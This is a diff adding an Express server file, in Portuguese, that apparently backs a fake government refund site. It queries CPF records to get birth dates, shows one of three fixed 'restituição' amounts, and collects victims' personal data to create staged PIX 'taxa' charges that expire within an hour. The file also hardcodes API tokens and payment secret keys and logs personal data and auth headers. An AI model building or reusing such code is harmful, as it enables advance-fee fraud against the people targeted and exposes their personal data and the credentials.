@@ -1,0 +1,280 @@
+// Arquivo server para o Heroku (CommonJS)
+const express = require('express');
+const path = require('path');
+const axios = require('axios');
+const fs = require('fs'); // Adicione esta linha
+
+// Iniciar o Express
+const app = express();
+const PORT = process.env.PORT || 5000;
+
+// Servir arquivos estáticos
+app.use(express.static(path.join(__dirname, 'dist/public')));
+
+// Configurar cabeçalhos de segurança
+app.use((req, res, next) => {
+  res.setHeader('X-Content-Type-Options', 'nosniff');
+  res.setHeader('X-Frame-Options', 'DENY');
+  res.setHeader('X-XSS-Protection', '1; mode=block');
+  next();
+});
+
+// Parser para JSON e URL-encoded
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// Função para calcular o valor de restituição com base na data de nascimento
+function calcularValorRestituicao(dataNascimento) {
+  // Padrão definido: apenas 3 possibilidades de valores
+  const hoje = new Date();
+  const nascimento = new Date(dataNascimento);
+  const idadeEmMeses = (hoje.getFullYear() - nascimento.getFullYear()) * 12 + hoje.getMonth() - nascimento.getMonth();
+  
+  // 1-11 meses: R$1.977,90
+  if (idadeEmMeses >= 1 && idadeEmMeses <= 11) {
+    return 1977.9;
+  }
+  // 1-3 anos: R$2.897,30
+  else if (idadeEmMeses >= 12 && idadeEmMeses <= 36) {
+    return 2897.3;
+  }
+  // 4-5 anos ou mais: R$3.221,16
+  else {
+    return 3221.16;
+  }
+}
+
+function formatarDataNascimento(dataStr) {
+  const data = new Date(dataStr);
+  const dia = String(data.getDate()).padStart(2, '0');
+  const mes = String(data.getMonth() + 1).padStart(2, '0');
+  const ano = data.getFullYear();
+  return `${dia}/${mes}/${ano}`;
+}
+
+// Rota para consulta de CPF
+app.get("/api/consulta-cpf", async (req, res) => {
+  try {
+    const cpf = req.query.cpf;
+    if (!cpf) {
+      return res.status(400).json({ error: "CPF não fornecido" });
+    }
+
+    // Usar o token diretamente em vez da variável de ambiente
+    const token = "268753a9b3a24819ae0f02159dee6724";
+    const url = `https://api.exato.digital/receita-federal/cpf?token=${token}&cpf=${cpf}&format=json`;
+    
+    const response = await axios.get(url);
+    const data = response.data;
+    
+    // ADICIONE AQUI: Formatar a data de nascimento antes de retornar
+    if (data && data.Result && data.Result.DataNascimento) {
+      data.Result.DataNascimentoFormatada = formatarDataNascimento(data.Result.DataNascimento);
+    }
+    
+    return res.json(data);
+  } catch (error) {
+    console.error("Erro ao consultar CPF:", error);
+    return res.status(500).json({ error: "Erro ao consultar CPF" });
+  }
+});
+
+// Rota para obter o valor da restituição
+app.get('/api/restituicao', async (req, res) => {
+  try {
+    const cpf = req.query.cpf;
+    if (!cpf) {
+      return res.status(400).json({ error: "CPF não fornecido" });
+    }
+
+    // Consultar CPF na Receita Federal para pegar a data de nascimento
+    const token = "268753a9b3a24819ae0f02159dee6724";
+    const url = `https://api.exato.digital/receita-federal/cpf?token=${token}&cpf=${cpf}&format=json`;
+    
+    const response = await axios.get(url);
+    const data = response.data;
+    
+    if (data && data.Result && data.Result.DataNascimento) {
+      const valorRestituicao = calcularValorRestituicao(data.Result.DataNascimento);
+      return res.json({ valor: valorRestituicao });
+    } else {
+      return res.status(404).json({ error: "Não foi possível obter a data de nascimento" });
+    }
+  } catch (error) {
+    console.error("Erro ao calcular restituição:", error);
+    return res.status(500).json({ error: "Erro ao calcular restituição" });
+  }
+});
+
+// Rota para detectar estado pela API de geolocalização
+app.get('/api/detectar-estado', async (req, res) => {
+  try {
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const response = await axios.get(`https://ipapi.co/${ip}/json/`);
+    const data = response.data;
+    
+    console.log('Dados da API de geolocalização:', data);
+    
+    let estado = null;
+    let siglaEstado = null;
+    
+    if (data && data.region) {
+      estado = data.region;
+      siglaEstado = data.region_code;
+      console.log(`Estado detectado pelo IP - Código: ${siglaEstado}, Nome: ${estado}`);
+    }
+    
+    return res.json({ 
+      estado: estado,
+      siglaEstado: siglaEstado,
+      ip: ip,
+      detalhes: {
+        countryCode: data.country_code,
+        regionName: data.region,
+        regionCode: data.region_code
+      }
+    });
+  } catch (error) {
+    console.error('Erro ao detectar estado:', error);
+    return res.status(500).json({ error: 'Erro ao detectar estado' });
+  }
+});
+
+// Rotas para pagamentos com For4Payments
+app.post('/api/pagamentos', async (req, res) => {
+  try {
+    const { valor, nome, cpf, email, telefone } = req.body;
+    
+    if (!valor || !nome || !cpf || !email || !telefone) {
+      return res.status(400).json({ error: "Dados incompletos para pagamento" });
+    }
+    
+    console.log('[For4Payments] Enviando pagamento com dados:', { valor, nome, cpf, email, telefone });
+    
+    // Remover formatação do telefone
+    const telefoneNumerico = telefone.replace(/\D/g, '');
+    
+    // For4Payments API
+    const API_URL = "https://app.for4payments.com.br/api/v1";
+    const secretKey = "ad6ab253-8ae1-454c-91f3-8ccb18933065";
+    const publicKey = "6d485c73-303b-466c-9344-d7b017dd1ecc";
+    
+    console.log('[For4Payments] Iniciando criação de pagamento com os dados:', {
+      amount: valor,
+      name: nome,
+      email: email,
+      cpf: cpf,
+      phone: telefoneNumerico
+    });
+    
+    // Formatar para centavos conforme documentação da For4Payments
+    const valorEmCentavos = Math.round(valor * 100);
+    const tipoPagamento = valor === 74.9 ? "TAXA TRE (1/3)" : 
+                          valor === 118.4 ? "TAXA TCN (2/3)" : "TAXA LAR (3/3)";
+    
+    // Preparar dados para API
+    const dataAtual = new Date();
+    const dataVencimento = new Date(dataAtual);
+    dataVencimento.setHours(dataVencimento.getHours() + 1); // Vencimento em 1 hora
+    
+    const paymentData = {
+      name: nome,
+      email: email,
+      cpf: cpf.replace(/\D/g, ''),
+      phone: telefoneNumerico,
+      paymentMethod: "PIX",
+      amount: valorEmCentavos,
+      items: [
+        {
+          title: tipoPagamento,
+          quantity: 1,
+          unitPrice: valorEmCentavos,
+          tangible: false
+        }
+      ],
+      dueDate: dataVencimento.toISOString()
+    };
+    
+    console.log('[For4Payments] Enviando dados para API:', JSON.stringify(paymentData));
+    console.log('[For4Payments] URL da API:', `${API_URL}/transaction.purchase`);
+    
+    const headers = {
+      'Authorization': secretKey,
+      'X-Public-Key': publicKey,
+      'Content-Type': 'application/json',
+      'Accept': 'application/json'
+    };
+    
+    console.log('[For4Payments] Headers:', JSON.stringify(headers));
+    
+    const response = await axios.post(`${API_URL}/transaction.purchase`, paymentData, { headers });
+    
+    console.log('[For4Payments] Status da resposta:', response.status, response.statusText);
+    
+    if (response.status === 200 || response.status === 201) {
+      const paymentResponse = response.data;
+      console.log('[For4Payments] Pagamento criado com sucesso:', paymentResponse.id);
+      return res.json({
+        id: paymentResponse.id,
+        pixCode: paymentResponse.pix.qrcode.text,
+        pixQrCode: paymentResponse.pix.qrcode.image,
+        expiresAt: paymentResponse.dueDate,
+        status: paymentResponse.status
+      });
+    } else {
+      console.error('[For4Payments] Erro ao criar pagamento:', response.data);
+      return res.status(response.status).json({ error: "Erro ao criar pagamento" });
+    }
+  } catch (error) {
+    console.error('[For4Payments] Erro ao processar pagamento:', error.response?.data || error.message);
+    return res.status(500).json({ error: "Erro ao processar pagamento" });
+  }
+});
+
+// Verificar status do pagamento
+app.get('/api/pagamentos/:id/status', async (req, res) => {
+  try {
+    const paymentId = req.params.id;
+    
+    if (!paymentId) {
+      return res.status(400).json({ error: "ID de pagamento não fornecido" });
+    }
+    
+    console.log('[For4Payments] Verificando status do pagamento:', paymentId);
+    
+    // For4Payments API
+    const API_URL = "https://app.for4payments.com.br/api/v1";
+    const secretKey = "ad6ab253-8ae1-454c-91f3-8ccb18933065";
+    const publicKey = "6d485c73-303b-466c-9344-d7b017dd1ecc";
+    
+    const headers = {
+      'Authorization': secretKey,
+      'X-Public-Key': publicKey,
+      'Content-Type': 'application/json',
+      'Accept': 'application/json'
+    };
+    
+    const response = await axios.get(`${API_URL}/transaction.status/${paymentId}`, { headers });
+    
+    if (response.status === 200) {
+      const statusData = response.data;
+      console.log('[For4Payments] Resposta do status:', statusData);
+      return res.json({ status: statusData.status });
+    } else {
+      return res.status(response.status).json({ error: "Erro ao verificar status do pagamento" });
+    }
+  } catch (error) {
+    console.error('[For4Payments] Erro ao verificar status:', error);
+    return res.status(500).json({ error: "Erro ao verificar status do pagamento" });
+  }
+});
+
+// Rota padrão para o SPA
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'dist/public', 'index.html'));
+});
+
+// Iniciar o servidor
+app.listen(PORT, () => {
+  console.log(`Servidor rodando na porta ${PORT}`);
+});
